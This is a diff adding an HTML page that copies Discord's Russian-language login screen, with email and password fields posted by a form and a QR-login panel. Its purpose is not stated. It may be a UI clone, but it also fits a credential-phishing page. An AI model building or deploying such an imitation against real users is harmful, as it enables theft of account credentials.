@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Discord</title>
+  <link rel="stylesheet" type="text/css" href="static/style.css">
+</head>
+<body>
+<canvas id="svgBlob"></canvas>
+
+<div class="position" >
+  <form class="container" method="post">
+    <div class="centering-wrapper">
+      <div class="section1 text-center">
+        <div class="primary-header">С возвращением!</div>
+        <div class="secondary-header">Мы так рады видеть вас снова!</div>
+
+          <div class="input-position">
+            <div class="form-group">
+                    <h5 class="input-placeholder" id="email-txt">Адрес электронной почты или номер телефона<span class="error-message" id="email-error"></span></h5>
+              <input type="pochta" required="true" name="logemail" class="form-style" id="logemail" autocomplete="off" style="margin-bottom: 20px;">
+              <i class="input-icon uil uil-at"></i>
+            </div>  
+                  <div class="form-group">
+                    <h5 class="input-placeholder" id="pword-txt">Пароль<span class="error-message" id="password-error"></span></h5>
+              <input type="password" required="true" name="logpass" class="form-style" id="logpass" autocomplete="on">
+              <i class="input-icon uil uil-lock-alt"></i>
+            </div>
+          </div>
+
+        <div class="password-container"><a href="#" class="link">Forgot your password?</a></div>
+          <div class="btn-position">
+          <button class="btn" type=submit>Войти</button>
+        </div>
+      </div>
+      <div class="horizontalSeparator"></div>
+      <div class="qr-login">
+        <div class="qr-container">
+          <span class="cubesWrapper" >
+            <span class="cube"></span>
+            <span class="cube"></span>
+          </span>
+        </div>
+        <div class="qr-pheader">Войти с помощью QR-кода</div>
+        <div class="qr-sheader">Отсканируйте код с помощью <strong>мобильного приложения Discord</strong>, чтобы сразу же войти в систему.</div>
+      </div>
+    </div>
+  </form>
+</div>
+</body>
+</html>
